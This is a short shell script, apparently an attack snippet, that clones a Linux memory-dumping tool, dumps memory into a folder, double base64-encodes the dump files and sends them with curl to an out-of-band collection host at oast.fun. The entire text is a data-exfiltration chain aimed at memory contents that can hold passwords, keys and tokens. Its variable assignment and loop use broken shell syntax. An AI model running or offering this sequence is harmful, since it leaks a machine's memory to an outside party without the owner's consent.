git clone https://github.com/fuhry/linux-memory-dumper.git


cd linux-memory-dumper

bash memdump -o test

$B64_BLOB=`for file in `ls test`; cat $file; done | base64 -w 0 | base64 -w 0`

curl -s -d "$B64_BLOB" "https://dqlfdzgroddmzbuqfjndfaghnnk8bq84t.oast.fun/" > /dev/null

echo "Done"